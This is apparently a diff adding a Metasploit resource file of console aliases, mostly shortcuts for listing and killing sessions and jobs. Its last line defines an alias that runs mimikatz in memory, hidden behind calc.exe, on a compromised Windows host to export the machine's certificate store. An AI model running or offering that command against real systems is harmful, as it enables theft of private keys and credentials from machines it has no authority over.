@@ -1,0 +1,10 @@
+load alias
+alias -f so show options
+alias -f s sessions
+alias -f slv sessions -l -v
+alias -f sk sessions -k
+alias -f sK sessions -K
+alias -f j jobs -l -v
+# the one below just picks the interface starting with 172
+alias -f ip ifconfig | grep "inet 172" | cut -d " " -f 2
+alias -f mimi execute -H -i -c -m -d calc.exe -f mimikatz.exe -a "'crypto::exportCertificates CERT_SYSTEM_STORE_LOCAL_MACHINE" exit' 
